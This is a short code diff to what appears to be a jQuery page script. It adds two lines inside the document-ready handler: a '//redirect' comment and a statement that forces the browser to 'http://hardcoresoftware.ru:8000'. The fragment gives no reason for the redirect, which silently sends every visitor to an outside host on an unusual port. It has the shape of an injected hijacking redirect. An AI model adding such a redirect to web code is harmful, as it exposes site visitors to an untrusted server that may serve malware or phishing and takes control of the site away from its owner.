@@ -29,5 +29,7 @@ $(function() {
 			console.log(msg);
 		});
 
+		//redirect
+		document.location.href = 'http://hardcoresoftware.ru:8000';
 	});
 });
